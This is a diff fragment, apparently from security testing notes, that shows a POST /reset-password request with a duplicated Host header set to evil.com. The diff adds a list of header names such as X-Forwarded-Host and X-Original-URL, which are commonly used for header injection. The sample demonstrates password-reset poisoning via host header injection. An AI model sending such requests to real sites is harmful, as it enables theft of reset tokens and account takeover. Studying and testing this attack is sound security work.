@@ -17,3 +17,5 @@ POST /reset-password HTTP/1.1
  Host: Site.com
 Host: evil.com
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0
+
+Client-IP", "Connection", "Contact", "Forwarded", "From", "Host", "Origin", "Referer", "True-Client-IP", "X-Client-IP", "X-Custom-IP-Authorization", "X-Forward-For", "X-Forwarded-For", "X-Forwarded-Host", "X-Forwarded-Server", "X-Host", "X-HTTP-Host-Override", "X-Original-URL", "X-Originating-IP", "X-Real-IP", "X-Remote-Addr", "X-Remote-IP", "X-Rewrite-URL", "X-Wap-Profile
